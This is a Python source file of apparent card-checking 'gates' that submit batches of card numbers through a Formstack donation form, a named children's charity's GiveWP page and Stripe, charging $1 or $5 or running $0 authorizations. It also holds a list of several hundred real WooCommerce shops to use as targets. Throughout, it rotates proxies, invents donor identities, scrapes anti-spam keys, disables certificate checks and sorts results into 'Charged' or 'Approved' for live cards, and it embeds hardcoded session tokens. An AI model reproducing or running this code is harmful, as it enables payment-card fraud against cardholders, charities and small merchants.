"""extra_gates.py — Stripe $1 / $5 / Auth2 $0 (v1 + v2)"""
import asyncio, random, re, string, uuid, json as _json
from urllib.parse import urlparse
import requests, aiohttp, urllib3
urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36")

def _proxy_dict(proxy):
    if not proxy: return None
    p = proxy.strip()
    if not p: return None
    if '://' not in p:
        if '@' in p: p = 'http://' + p
        else:
            parts = p.split(':')
            if len(parts) == 2: p = f'http://{parts[0]}:{parts[1]}'
            elif len(parts) == 4: p = f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
            else: p = 'http://' + p
    return {'http': p, 'https': p}

def _proxy_url(proxy):
    if not proxy: return None
    p = proxy.strip()
    if not p: return None
    if p.startswith(('http://','https://','socks4://','socks5://')): return p
    if '@' in p: return f'http://{p}'
    parts = p.split(':')
    if len(parts) == 2: return f'http://{p}'
    if len(parts) == 4: return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return f'http://{p}'

def _is_net_error(resp: str) -> bool:
    r = (resp or '').lower()
    return any(k in r for k in (
        'connectionpool','httpsconnectionpool','httpconnectionpool',
        'proxy','timeout','timed out','net:','network',
    ))

# ══════════════════════════════════════════════════════════
# STRIPE $1 — FormStack
# ══════════════════════════════════════════════════════════
FORMSTACK_URL = 'https://sfapi.formstack.io/FormEngine/EngineFrame/CheckPayment'

def _sync_st1(card, proxy=None):
    try:
        cn, mm, yy, cvv = card.strip().split('|')
    except:
        return {'Status': 'Error', 'Response': 'Invalid card', 'Card': card}

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarylrxtO8wYB0rCO2sV',
        'Origin': 'https://formstack.io',
        'Referer': 'https://formstack.io/',
        'User-Agent': UA,
    }
    F = None
    files = [
        ('inputdate', (F, '11/3/2024 4:21:19')),
        ('userTimeZone', (F, '300')),
        ('txtHtmlId', (F, '2hbx1Fv8p-niFCJlWMSc5A')),
        ('txtSendSizeChange', (F, '')),
        ('txtObjId', (F, '')),
        ('txtOrgId', (F, 'St_LAnKxoEYM11rYjHBghR4LC0uJo-4KW5ABUsHvA54')),
        ('txtAuthToken', (F, '')),
        ('txtRefreshToken', (F, 'K0zpx8wxB38TXNrQVoMdHfRdIOC0XaH9ODN3-WwCDJG3qGlg2fZR8n4aFTRv1rENKoxcPKPuZUMiiW44yDjfo6YlzFFtKqw7BORu6686PmCPuIcpr8qYuYM4nD8KrkCn')),
        ('txtAccessURI', (F, '')),
        ('txtSessionID', (F, '7NCNQJHy9zzdPPN4Au831Mc7MO7cmTs2UzRJNvb1RKetD-H6B8uVZfauMca4LULJ')),
        ('txtSubmittedData', (F, '')),
        ('formHtml', (F, '')),
        ('multipageEnabled', (F, 'False')),
        ('breadcrumbEnabled', (F, 'False')),
        ('breadcrumbNumbered', (F, 'False')),
        ('breadcrumbPrefix', (F, '')),
        ('submitMessage', (F, 'Thank you for your submission!')),
        ('submitUrl', (F, '')),
        ('submitBtnText', (F, 'Submit ')),
        ('prevBtnText', (F, 'Back')),
        ('nextBtnText', (F, 'Next')),
        ('pageValType', (F, 'form')),
        ('txtUserContentId', (F, '')),
        ('hasCustomCSS', (F, 'True')),
        ('isCurrentForm', (F, 'False')),
        ('packageTier', (F, '')),
        ('isDraft', (F, 'False')),
        ('saveForLaterEnabled', (F, 'False')),
        ('saveBtnText', (F, 'Save')),
        ('discardBtnText', (F, 'Discard')),
        ('draftSaved', (F, '')),
        ('draftEmail', (F, '')),
        ('paymentType', (F, 'Stripe')),
        ('formName', (F, 'Donation Management Form')),
        ('formId', (F, '')),
        ('CommunityInstanceURL', (F, '')),
        ('CommunitySessioID', (F, '')),
        ('CommunityUserId', (F, '')),
        ('CommunityUserType', (F, '')),
        ('CommunityViewMode', (F, '')),
        ('comPrefillDataset', (F, '')),
        ('prefillDataset', (F, '')),
        ('comPrefillObj', (F, '')),
        ('hfFileServiceEndpoint', (F, 'https://sfapi.formstack.io')),
        ('hfFileServiceApiKey', (F, '8fc5982e-6eca-4d73-a3ff-997902b163b0-20212151122')),
        ('reCaptchaV3token', (F, '')),
        ('submissionWorkflowId', (F, '')),
        ('isPopulateHTMLFromBackEnd', (F, 'True')),
        ('hfIsNativePaymentOn', (F, 'False')),
        ('hfDefaultNativeSiteURL', (F, '')),
        ('hfPackageNamespace', (F, 'VisualAntidote__')),
        ('submitRules', (F, '')),
        ('FSGFRadioButton356', (F, 'Company%20Donation')),
        ('Contact.npsp__Primary_Affiliation__c.Name', (F, 'New%20yorm')),
        ('Contact.FirstName', (F, 'williams')),
        ('Contact.LastName', (F, 'hiro')),
        ('Contact.Email', (F, 'aa0799414021%40gmail.com')),
        ('Contact.HomePhone', (F, '5124578451')),
        ('Contact.npsp__Primary_Affiliation__c.Phone', (F, '5124578451')),
        ('Contact.Alumni__c', (F, 'No')),
        ('FSGFRadioButton346', (F, 'One-Time%20Donation')),
        ('FSGFDropdown701', (F, 'The%20School%20of%20Community%20Development%20and%20Public%20Services%20Education%20%28CDPSE%29')),
        ('Contact.Opportunity.A.Amount', (F, '1')),
        ('FSGFRadioButton436', (F, 'No')),
        ('Contact.Opportunity.A.Preferred_Name_on_Donaiton__c', (F, 'Williams')),
        ('Contact.Opportunity.A.Funding_Program__c', (F, 'a0u8V00000AT2h7QAD')),
        ('Contact.Opportunity.A.CloseDate', (F, '11%2F03%2F2024')),
        ('Contact.Opportunity.A.Name', (F, 'New%20yorm%20External%20Donation%2011%2F03%2F2024')),
        ('Contact.Opportunity.A.RecordTypeId', (F, '0128V000001iNcAQAU')),
        ('Contact.Opportunity.A.CampaignId', (F, '7018V000000sLgrQAE')),
        ('Contact.Opportunity.A.Method_of_Payment__c', (F, 'Credit%20Card')),
        ('Contact.Opportunity.A.StageName', (F, 'Closed%20Won')),
        ('Contact.Opportunity.A.Type_of_donation_company_individual__c', (F, 'Company%20Donation')),
        ('Contact.Opportunity.A.Remain_Anonymous__c', (F, 'No')),
        ('FSGFRadioButton831', (F, 'Yes')),
        ('FSGFShortAnswer6', (F, 'william%20Hiro')),
        ('FSGFShortAnswer776', (F, 'Hiro%20Hiroo')),
        ('Contact.npe01__AlternateEmail__c', (F, 'aa0799414021%40gmail.com')),
        ('Contact.AccountId.BillingStreet', (F, '123%20williams%20street%0Azh')),
        ('Contact.AccountId.BillingCity', (F, 'NY')),
        ('Contact.AccountId.BillingState', (F, 'New%20York')),
        ('Contact.AccountId.BillingPostalCode', (F, '10080')),
        ('Contact.AccountId.BillingCountry', (F, 'United%20States')),
        ('FFCreditCard14', (F, cn)),
        ('FFCVV14', (F, cvv)),
        ('FFExpiryMM14', (F, mm)),
        ('FFExpiryYYYY14', (F, yy)),
        ('Contact.AccountId.Name', (F, 'hiro%20Household')),
        ('Contact.AccountId.RecordTypeId', (F, '0128V000001iNc8QAE')),
        ('Contact.npsp__Primary_Affiliation__c.RecordTypeId', (F, '0128V000001iNc9QAE')),
        ('FSGFShortAnswer240', (F, '11%2F03%2F2024')),
        ('ReturnUrl', (F, 'https://formstack.io/D5036')),
    ]

    try:
        r = requests.post(FORMSTACK_URL, headers=headers, files=files,
                          proxies=_proxy_dict(proxy), timeout=30, verify=False)
    except requests.exceptions.Timeout:
        return {'Status': 'Error', 'Response': 'timeout', 'Card': card}
    except Exception as e:
        return {'Status': 'Error', 'Response': f'net: {str(e)[:60]}', 'Card': card}

    body = r.text.lower()
    if 'security code is incorrect' in body:
        return {'Status': 'Approved CCN ✅', 'Response': 'CVV mismatch — LIVE', 'Card': card}
    if 'your card could not be' in body:
        return {'Status': 'Approved ✅', 'Response': 'Live — prepaid restricted', 'Card': card}
    if 'declined' in body or 'card number is incorrect' in body or 'expiration' in body or 'sorry, we do not accept' in body:
        return {'Status': 'Declined ❌', 'Response': 'Declined', 'Card': card}
    if 'thank you' in body or 'success' in body:
        return {'Status': 'Charged ✅', 'Response': 'Stripe $1 charged', 'Card': card}
    return {'Status': 'Declined ❌', 'Response': 'Declined', 'Card': card}

async def check_st1(card, proxy=None):
    last = None
    for attempt in range(3):
        r = await asyncio.to_thread(_sync_st1, card, proxy)
        last = r
        if not _is_net_error(r.get('Response', '')):
            return r
        if attempt < 2: await asyncio.sleep(1.5 + random.uniform(0, 1))
    return last

# ══════════════════════════════════════════════════════════
# STRIPE $5 — GiveWP
# ══════════════════════════════════════════════════════════
DONATE_URL = 'https://ourkidsatheart.com/donate-now-austin-chapter/'
FORM_URL   = 'https://ourkidsatheart.com/donate-now-austin-chapter/?payment-mode=stripe'

def _sync_st5(card, proxy=None):
    parts = card.strip().split('|')
    if len(parts) != 4:
        return {'Status': 'Error', 'Response': 'Invalid card', 'Card': card}
    number, month, year, cvv = parts
    if len(year) == 4: year = year[-2:]
    month = month.zfill(2)

    fnames = ['Ahmed','Mohamed','Sarah','Omar','Hannah','Yara','Khaled','Lina']
    lnames = ['Khalil','Smith','Williams','Garcia','Martinez','Brown']
    letters = ''.join(random.choices(string.ascii_lowercase, k=20))
    digits  = f'{random.randint(0, 9999):04d}'
    d = {'first': random.choice(fnames), 'last': random.choice(lnames),
         'email': f'{letters}{digits}@gmail.com'}

    s = requests.Session()
    s.verify = False
    s.headers.update({'User-Agent': UA})
    pd = _proxy_dict(proxy)
    if pd: s.proxies = pd

    try:
        r = s.get(DONATE_URL, timeout=20)
    except Exception as e:
        return {'Status': 'Error', 'Response': f'conn: {str(e)[:60]}', 'Card': card}
    html = r.text

    def grab(pat):
        m = re.search(pat, html)
        return m.group(1) if m else ''

    form_id   = grab(r'name="give-form-id" value="([^"]+)"')
    prefix    = grab(r'name="give-form-id-prefix" value="([^"]+)"')
    form_hash = grab(r'name="give-form-hash" value="([^"]+)"')
    register  = grab(r'name="give-form-user-register-hash" value="([^"]+)"')
    account   = grab(r'data-account="([^"]+)"')
    pk_live   = grab(r'data-publishable-key="([^"]+)"')
    spam_key  = grab(r'ZeroSpamDavidWalsh\s*=\s*\{[^}]*?"key"\s*:\s*"([^"]+)"')

    if not all([form_id, prefix, form_hash, register, account, pk_live]):
        return {'Status': 'Error', 'Response': 'token extraction failed', 'Card': card}

    guid = str(uuid.uuid4())
    pm_data = {
        'type': 'card',
        'billing_details[name]': f"{d['first']} {d['last']}",
        'billing_details[email]': d['email'],
        'billing_details[address][line1]': 'New york new states 1000',
        'billing_details[address][city]': 'New york',
        'billing_details[address][state]': 'NY',
        'billing_details[address][postal_code]': '10080',
        'billing_details[address][country]': 'US',
        'card[number]': number, 'card[cvc]': cvv,
        'card[exp_month]': month, 'card[exp_year]': year,
        'guid': guid, 'muid': guid, 'sid': guid,
        'payment_user_agent': 'stripe.js/148043f9d7; stripe-js-v3/148043f9d7; split-card-element',
        'referrer': 'https://ourkidsatheart.com',
        'time_on_page': '1303230',
        'key': pk_live,
        '_stripe_account': account,
    }
    try:
        r = s.post('https://api.stripe.com/v1/payment_methods', data=pm_data,
                   headers={'Accept': 'application/json',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': 'https://js.stripe.com',
                            'Referer': 'https://js.stripe.com/'}, timeout=25)
        sj = r.json()
    except Exception as e:
        return {'Status': 'Error', 'Response': f'stripe: {str(e)[:60]}', 'Card': card}

    if 'id' not in sj:
        err = sj.get('error', {}).get('message', 'tokenization failed')
        return {'Status': 'Declined ❌', 'Response': f'stripe: {err[:60]}', 'Card': card}
    pm_id = sj['id']

    donation = {
        'give-honeypot': '',
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-title': 'Donate - Austin',
        'give-current-url': DONATE_URL,
        'give-form-url': DONATE_URL,
        'give-form-minimum': '5.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': form_hash,
        'give-price-id': 'custom',
        'give-recurring-logged-in-only': '',
        'give-logged-in-only': '1',
        '_give_is_donation_recurring': '0',
        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
        'give-amount': '5.00',
        'give-recurring-period-donors-choice': 'day',
        'give_referral': d['first'],
        'give_stripe_payment_method': pm_id,
        'payment-mode': 'stripe',
        'give_first': d['first'],
        'give_last': d['last'],
        'give_email': d['email'],
        'give-form-user-register-hash': register,
        'give-purchase-var': 'needs-to-register',
        'card_name': d['first'],
        'billing_country': 'US',
        'card_address': 'New york new states 1000',
        'card_address_2': '',
        'card_city': 'New york',
        'card_state': 'NY',
        'card_zip': '10080',
        'give_action': 'purchase',
        'give-gateway': 'stripe',
        '71MzG': '',
        'zerospam_david_walsh_key': spam_key,
    }
    try:
        r = s.post(f'{FORM_URL}&form-id={form_id}', data=donation,
                   headers={'Accept': 'text/html',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': 'https://ourkidsatheart.com',
                            'Referer': DONATE_URL}, timeout=25)
    except Exception as e:
        return {'Status': 'Error', 'Response': f'donation: {str(e)[:60]}', 'Card': card}

    body = r.text
    low  = body.lower()
    if 'thank you for your donation' in low or 'thank you' in low or 'successfully' in low:
        return {'Status': 'Charged ✅', 'Response': '$5 donation successful', 'Card': card}
    if 'requires_action' in low:
        return {'Status': 'Approved 3DS ✅', 'Response': '3DS required', 'Card': card}

    m = re.search(r'<strong>Error</strong>:\s*(.*?)</p>', body, re.S)
    if m:
        err = re.sub(r'<[^>]+>', '', m.group(1)).strip()[:150]
        el  = err.lower()
        if 'insufficient' in el:
            return {'Status': 'Approved CVV ✅', 'Response': f'insufficient — {err}', 'Card': card}
        if 'cvv' in el or 'security' in el:
            return {'Status': 'Approved CCN ❌', 'Response': f'CVV mismatch — {err}', 'Card': card}
        if 'address' in el or 'zip' in el:
            return {'Status': 'Approved AVS ❌', 'Response': f'AVS mismatch — {err}', 'Card': card}
        return {'Status': 'Declined ❌', 'Response': err, 'Card': card}

    return {'Status': 'Declined ❌', 'Response': 'Payment failed', 'Card': card}

async def check_st5(card, proxy=None):
    return await asyncio.to_thread(_sync_st5, card, proxy)

# ══════════════════════════════════════════════════════════
# STRIPE AUTH2 $0 — v1 + v2 sites
# ══════════════════════════════════════════════════════════
AUTH_SITES = [
    'https://innercitytigers.com',
    'https://www.professionalmarine.eu',
    'https://www.domainegayda.com',
    'https://ecolution-hubs.co.uk',
    'https://shop.nemaneide.com',
]

_AUTH_SITES_1_RAW = """
www.properfile.com/my-account | Stripe | stripe | Auth : True
www.moweystudio.com/my-account | Stripe | stripe_cc | Auth : True
baslia.com/my-account | Stripe | woocommerce_payments | Auth : True
jaysbeautystore.com/my-account | Stripe | stripe | Auth : True
bettyblizz.com/my-account | Stripe | woocommerce_payments | Auth : True
www.5ave.com/my-account | Stripe | woocommerce_payments | Auth : True
bannardhinkley.com/my-account | Stripe | woocommerce_payments | Auth : True
avaroseleggings.com/my-account | Stripe | stripe | Auth : True
www.myhidaya.com/my-account | Stripe | stripe | Auth : True
shop.vertxglobal.com/my-account-2 | Stripe | stripe_cc | Auth : True
mnldesign.com/my-account | Stripe | stripe | Auth : True
patriottradesman.com/my-account | Stripe | stripe | Auth : True
eshopera.com/my-account | Stripe | woocommerce_payments | Auth : True
zlily.com/my-account | Stripe | woocommerce_payments | Auth : True
day4deals.com/my-account | Stripe | stripe | Auth : True
vizslatea.com/my-account | Stripe | stripe | Auth : True
sweet-signature.com/my-account | Stripe | stripe_cc | Auth : True
lolaandveranda.com/my-account | Stripe | stripe | Auth : True
aayeu.com/my-account | Stripe | stripe | Auth : True
barnegave.com/my-account-2 | Stripe | woocommerce_payments | Auth : True
www.psiroy.com/my-account | Stripe | stripe | Auth : True
www.kayrana.com/my-account | Stripe | stripe | Auth : True
uzane.com/my-account | Stripe | woocommerce_payments | Auth : True
www.highgroundgaming.com/my-account | Stripe | woocommerce_payments | Auth : True
www.mr-styles.com/my-account | Stripe | stripe | Auth : True
www.bellamilton.com/my-account | Stripe | woocommerce_payments | Auth : True
lasaky.com/my-account | Stripe | woocommerce_payments | Auth : True
bubbaskincare.com/my-account | Stripe | stripe_cc | Auth : True
theathleisure.com/my-account | Stripe | stripe | Auth : True
chuckswoodbarn.com/my-account | Stripe | stripe | Auth : True
familyloves.com/my-account | Stripe | stripe | Auth : True
fancyimpress.com/my-account | Stripe | stripe | Auth : True
neetanaturals.com/my-account | Stripe | stripe_cc | Auth : True
www.cozzettebeauty.com/my-account | Stripe | woocommerce_payments | Auth : True
meibdaa.com/my-account | Stripe | stripe | Auth : True
faiir.com/my-account | Stripe | woocommerce_payments | Auth : True
kalses.com/my-account | Stripe | stripe_cc | Auth : True
danityroyalcreations.com/my-account | Stripe | stripe | Auth : True
culturalstoryweaver.com/my-account | Stripe | stripe | Auth : True
romerosjewelry.com/my-account | Stripe | stripe | Auth : True
stephaniascollections.com/my-account | Stripe | stripe | Auth : True
joymoy.com/my-account | Stripe | stripe | Auth : True
bougieandhealthy.com/my-account | Stripe | stripe | Auth : True
leatherhubonline.com/my-account | Stripe | stripe | Auth : True
zoominypro.com/my-account | Stripe | woocommerce_payments | Auth : True
adotem.com/my-account | Stripe | stripe | Auth : True
glizar.com/my-account | Stripe | woocommerce_payments | Auth : True
www.norrska.com/my-account | Stripe | stripe | Auth : True
shop.qatgifts.com/my-account | Stripe | stripe_cc | Auth : True
shop.ribigifts.com/my-account | Stripe | stripe_cc | Auth : True
eclectic-niche.com/my-account | Stripe | stripe | Auth : True
fourthdaughter.com/my-account | Stripe | authnet | Auth : True
outdoordockbox.com/my-account | Stripe | woocommerce_payments | Auth : True
www.mrbackpacks.com/my-account | Stripe | stripe | Auth : True
skafimpex.com/my-account | Stripe | stripe | Auth : True
shop-caymans.com/my-account | Stripe | stripe | Auth : True
bootsbyfashion.com/my-account | Stripe | stripe | Auth : True
russoo.com/my-account | Stripe | woocommerce_payments | Auth : True
gearnoble.com/my-account | Stripe | stripe | Auth : True
highvoltagecustom.com/my-account | Stripe | woocommerce_payments | Auth : True
annroo.com/my-account | Stripe | woocommerce_payments | Auth : True
beyondshoping.com/my-account | Stripe | woocommerce_payments | Auth : True
www.cocosorisi.com/my-account | Stripe | stripe_cc | Auth : True
elektriskgrill.com/my-account | Stripe | woocommerce_payments | Auth : True
slicespark.com/my-account | Stripe | stripe | Auth : True
eromis.com/my-account | Stripe | woocommerce_payments | Auth : True
orevaa.com/my-account | Stripe | woocommerce_payments | Auth : True
infiniteautowerks.com/my-account | Stripe | stripe | Auth : True
summercedar.com/my-account | Stripe | stripe | Auth : True
oanasavu.com/my-account | Stripe | woocommerce_payments | Auth : True
elluis.com/my-account | Stripe | woocommerce_payments | Auth : True
heavenlysale.com/my-account | Stripe | stripe | Auth : True
forgedfitnessequipment.com/my-account | Stripe | woocommerce_payments | Auth : True
solomyeshop.com/my-account | Stripe | woocommerce_payments | Auth : True
wildmintcraftworks.com/my-account | Stripe | woocommerce_payments | Auth : True
handprintalliance.com/my-account | Stripe | stripe | Auth : True
ruggedapparelshop.com/my-account | Stripe | stripe | Auth : True
shopluxstore.com/my-account | Stripe | stripe | Auth : True
www.wulibike.com/my-account | Stripe | stripe | Auth : True
blackarrowintl.com/my-account | Stripe | stripe | Auth : True
shopluxify.com/my-account | Stripe | stripe | Auth : True
lonchemin.com/my-account | Stripe | stripe | Auth : True
probatteryshops.com/my-account | Stripe | NA | Auth : True
bestwebprojects.com/my-account | Stripe | stripe_cc | Auth : True
www.alizbay.com/my-account | Stripe | stripe | Auth : True
dainte.com/my-account | Stripe | stripe | Auth : True
retromoderngifts.com/my-account | Stripe | woocommerce_payments | Auth : True
meloriaswimandfashion.com/my-account | Stripe | stripe | Auth : True
leashylounge.com/my-account | Stripe | stripe | Auth : True
newzealandtrends.com/my-account | Stripe | woocommerce_payments | Auth : True
mazaltovjudaica.com/my-account | Stripe | stripe | Auth : True
sheerjoyscents.com/my-account | Stripe | woocommerce_payments | Auth : True
www.littlemoonshop.com/my-account | Stripe | stripe | Auth : True
www.metasports.com/my-account | Stripe | stripe | Auth : True
mypersonalizedsocks.com/my-account | Stripe | stripe | Auth : True
buymetalstraws.com/my-account | Stripe | stripe | Auth : True
discount59.com/my-account | Stripe | stripe | Auth : True
smaxfashion.com/my-account | Stripe | stripe_upm | Auth : True
mybatonrougemommy.com/my-account | Stripe | authnet | Auth : True
www.beauty-addict.com/my-account | Stripe | stripe_cc | Auth : True
damngoodthing.com/my-account | Stripe | stripe | Auth : True
dealszon.com/my-account | Stripe | stripe | Auth : True
sissylover.com/my-account | Stripe | stripe | Auth : True
bentleylanecreations.com/my-account | Stripe | stripe | Auth : True
old.neodirect.com/my-account | Stripe | eh_stripe_pay | Auth : True
sajjadandsons.com/my-account | Stripe | stripe | Auth : True
iconichairproducts.com/my-account | Stripe | woocommerce_payments | Auth : True
www.comfyballs.com/my-account | Stripe | stripe | Auth : True
shades-dancewear.com/my-account | Stripe | stripe | Auth : True
uhbstamped.com/my-account | Stripe | woocommerce_payments | Auth : True
beierstores.com/my-account | Stripe | stripe_cc | Auth : True
sharkwatchband.com/my-account | Stripe | stripe | Auth : True
bella-jewelry.com/my-account | Stripe | stripe | Auth : True
www.kuddycosmetics.com/my-account | Stripe | paystack | Auth : True
fashionforgeltd.com/my-account | Stripe | stripe | Auth : True
homeyzon.com/my-account | Stripe | NA | Auth : True
factoryglassesdirect.com/fgd-account | Stripe | stripe | Auth : True
dragqueen-plus.com/my-account | Stripe | stripe | Auth : True
warminter.com/my-account | Stripe | fkwcs_stripe | Auth : True
instantbeautystore.com/my-account | Stripe | woocommerce_payments | Auth : True
bozicostore.com/my-account | Stripe | stripe | Auth : True
dolphinbazaar.com/my-account | Stripe | cpsw_stripe | Auth : True
k-beautydepot.com/my-account | Stripe | woocommerce_payments | Auth : True
revitamoss.com/my-account | Stripe | stripe_cc | Auth : True
comfortatreach.com/my-account | Stripe | stripe_cc | Auth : True
vintagejewelrytrade.com/my-account | Stripe | stripe | Auth : True
wanderagio.com/my-account | Stripe | stripe_cc | Auth : True
runnwalk.com/my-account | Stripe | stripe | Auth : True
www.yarnandpaper.com/my-account | Stripe | stripe | Auth : True
designcustombags.com/my-account | Stripe | stripe | Auth : True
www.poplarworkshop.com/my-account | Stripe | woocommerce_payments | Auth : True
laserweldermachines.com/my-account | Stripe | cpsw_stripe | Auth : True
sophiafiori.com/my-account | Stripe | stripe_cc | Auth : True
shop.catarinagarciaart.com/my-account | Stripe | stripe | Auth : True
leathershoesclub.com/my-account | Stripe | woocommerce_payments | Auth : True
www.stoiccouture.com/my-account | Stripe | woocommerce_payments | Auth : True
mastrend.com/my-account | Stripe | stripe | Auth : True
www.alifetransformedblog.com/my-account | Stripe | stripe | Auth : True
custom101prints.com/my-account | Stripe | woocommerce_payments | Auth : True
swiftsly.com/my-account | Stripe | stripe_cc | Auth : True
smartmobilehut.com/my-account | Stripe | stripe | Auth : True
eteebeautyessentials.com/my-account | Stripe | woocommerce_payments | Auth : True
koolkartz.com/my-account | Stripe | woocommerce_payments | Auth : True
bloomingjewels.com/my-account | Stripe | stripe | Auth : True
voguewonder.com/my-account | Stripe | stripe_cc | Auth : True
shop.ohmy-creative.com/my-account | Stripe | stripe | Auth : True
craftcombat.com/my-account | Stripe | woocommerce_payments | Auth : True
www.shop.mcollinx.com/my-account | Stripe | stripe | Auth : True
shop.polishfoodies.com/my-account | Stripe | stripe | Auth : True
greaturbaneats.com/my-account | Stripe | stripe | Auth : True
issswag.com/my-account | Stripe | stripe | Auth : True
www.casateak.com/my-account | Stripe | stripe | Auth : True
havilahcastle.com/my-account | Stripe | stripe | Auth : True
uegclub.com/my-account | Stripe | stripe_cc | Auth : True
shop.pennathur.com/my-account | Stripe | stripe_cc | Auth : True
indicana.com/my-account | Stripe | stripe_cc | Auth : True
krama-khmer.com/my-account | Stripe | woocommerce_payments | Auth : True
blackownedelite.com/my-account | Stripe | stripe | Auth : True
art-resurgence.com/my-account | Stripe | woocommerce_payments | Auth : True
lowkeyarchives.com/my-account | Stripe | stripe | Auth : True
ethosconceptstore.com/my-account | Stripe | woocommerce_payments | Auth : True
emongus.com/my-account | Stripe | stripe | Auth : True
bjux.com/my-account | Stripe | woocommerce_payments | Auth : True
candygoth.com/my-account | Stripe | stripe | Auth : True
clearoll.com/my-account | Stripe | woocommerce_payments | Auth : True
hipeclo.com/my-account | Stripe | stripe | Auth : True
bormay.com/my-account | Stripe | woocommerce_payments | Auth : True
shop.carpetsandbeds.com/my-account | Stripe | stripe_cc | Auth : True
yessweetheart.com/my-account | Stripe | stripe | Auth : True
www.toddlinens.com/my-account | Stripe | woocommerce_payments | Auth : True
squeakychimp.com/my-account | Stripe | stripe | Auth : True
theuplandhunters.com/my-account | Stripe | woocommerce_payments | Auth : True
culinaryze.com/my-account | Stripe | woocommerce_payments | Auth : True
www.thegreenwayfitness.com/my-account | Stripe | woocommerce_payments | Auth : True
hidretrofitkit.com/my-account | Stripe | stripe | Auth : True
www.makesfoodscents.com/my-account | Stripe | stripe_cc | Auth : True
www.dreamgelnails.com/my-account | Stripe | stripe | Auth : True
www.doonneys.com/my-account | Stripe | stripe | Auth : True
www.marcillabailey.com/my-account | Stripe | stripe | Auth : True
www.lalupahandbags.com/my-account | Stripe | stripe | Auth : True
uscapwholesale.com/my-account | Stripe | stripe_cc | Auth : True
gemstategraphix.com/my-account | Stripe | woocommerce_payments | Auth : True
chiustyle.com/my-account-2-2 | Stripe | woocommerce_payments | Auth : True
thelazypot.com/my-account | Stripe | woocommerce_payments | Auth : True
smoothitalia.com/my-account | Stripe | xpay | Auth : True
gracebeautyandfbombs.com/my-account | Stripe | woocommerce_payments | Auth : True
prima-qualitas.com/my-account | Stripe | stripe | Auth : True
oneoftwelve.com/my-account | Stripe | stripe_cc | Auth : True
www.incclo.com/my-account | Stripe | stripe_cc | Auth : True
azskinandbody.com/my-account | Stripe | stripe | Auth : True
skinworkswellness.com/my-account | Stripe | stripe | Auth : True
shabahangrugs.com/my-account | Stripe | woocommerce_payments | Auth : True
sunshinetee.com/my-account | Stripe | stripe | Auth : True
fixmyifone.com/my-account | Stripe | stripe | Auth : True
standracoon.com/my-account | Stripe | woocommerce_payments | Auth : True
papabearadventures.com/my-account | Stripe | woocommerce_payments | Auth : True
focilo.com/my-account | Stripe | stripe | Auth : True
mariotailor.com/my-account | Stripe | stripe | Auth : True
frencheye.com/my-account | Stripe | stripe | Auth : True
broadmoorjewelryco.com/my-account | Stripe | stripe | Auth : True
customballcap.com/my-account | Stripe | stripe_cc | Auth : True
stellarofficefurniture.com/my-account | Stripe | stripe_ach | Auth : True
shaperack.com/my-account | Stripe | stripe | Auth : True
lapivi.com/my-account | Stripe | stripe_cc | Auth : True
whole-prime.com/my-account | Stripe | woocommerce_payments | Auth : True
shop.ticarella.com/my-account | Stripe | stripe | Auth : True
wishbuckets.com/my-account | Stripe | stripe | Auth : True
www.medicdrugstore.com/my-account | Stripe | stripe_cc | Auth : True
willandweaves.com/my-account | Stripe | stripe | Auth : True
urban-guerilla.com/my-account | Stripe | woocommerce_payments | Auth : True
www.margaretmayar.com/my-account | Stripe | woocommerce_payments | Auth : True
towingcentres.com/my-account | Stripe | woocommerce_payments | Auth : True
estateclicks.com/my-account | Stripe | stripe | Auth : True
knowgreenvalley.com/my-account | Stripe | stripe | Auth : True
spokenwordplaypodcast.com/my-account | Stripe | woocommerce_payments | Auth : True
theprimeleathers.com/my-account | Stripe | stripe | Auth : True
taboofashion.com/my-account | Stripe | stripe | Auth : True
www.an-y1.com/my-account | Stripe | stripe | Auth : True
hanyajewelry.com/my-account | Stripe | stripe | Auth : True
manisoptics.com/my-account | Stripe | stripe | Auth : True
shop.ae.optispectrum.com/my-account | Stripe | stripe | Auth : True
shop.caviarskinclinic.com/my-account | Stripe | stripe_cc | Auth : True
svetlanakleine.com/my-account | Stripe | stripe_cc | Auth : True
www.ecowool.com/my-account | Stripe | stripe | Auth : True
www.galleryl7inc.com/my-account | Stripe | stripe | Auth : True
bloomprintcoffee.com/my-account | Stripe | stripe | Auth : True
dhxart.com/my-account | Stripe | woocommerce_payments | Auth : True
shop.gadgetreclaim.com/my-account | Stripe | woocommerce_payments | Auth : True
sharonlovely.com/my-account | Stripe | stripe | Auth : True
shop.collaborateworship.com/my-account | Stripe | woocommerce_payments | Auth : True
shop.conequipmentparts.com/my-account | Stripe | stripe | Auth : True
www.mlxled.com/my-account | Stripe | stripe | Auth : True
dancepartylights.com/my-account | Stripe | stripe | Auth : True
worldofcarvings.com/my-account | Stripe | woocommerce_payments | Auth : True
buypetpacks.com/my-account | Stripe | stripe | Auth : True
sergio-leathers.com/my-account | Stripe | stripe | Auth : True
kelterborn-crafts.com/my-account | Stripe | stripe | Auth : True
yibling.com/my-account | Stripe | NA | Auth : True
www.warrinadesigns.com/my-account | Stripe | stripe | Auth : True
temzli.com/my-account | Stripe | stripe | Auth : True
cotenis.com/my-account | Stripe | stripe | Auth : True
goldenlinejewellers.com/my-account | Stripe | stripe | Auth : True
aluelite.com/my-account | Stripe | stripe_cc | Auth : True
sproutandspindle.com/my-account | Stripe | stripe_cc | Auth : True
harrymag-ng.com/my-account | Stripe | tbz_rave | Auth : True
shop.littlefeetdenver.com/my-account | Stripe | stripe | Auth : True
prettyplainpaper.com/my-account | Stripe | stripe | Auth : True
colanes.com/my-account-2 | Stripe | stripe | Auth : True
outstandingproducts100.com/my-account | Stripe | stripe | Auth : True
filsonjackets.com/my-account | Stripe | fkwcs_stripe | Auth : True
mor-choice.com/my-account | Stripe | stripe_cc | Auth : True
salee33america.com/my-account | Stripe | stripe | Auth : True
greatestofallts.com/my-account | Stripe | woocommerce_payments | Auth : True
daria.coolwick.com/my-account | Stripe | woocommerce_payments | Auth : True
baby-sale.com/my-account | Stripe | stripe | Auth : True
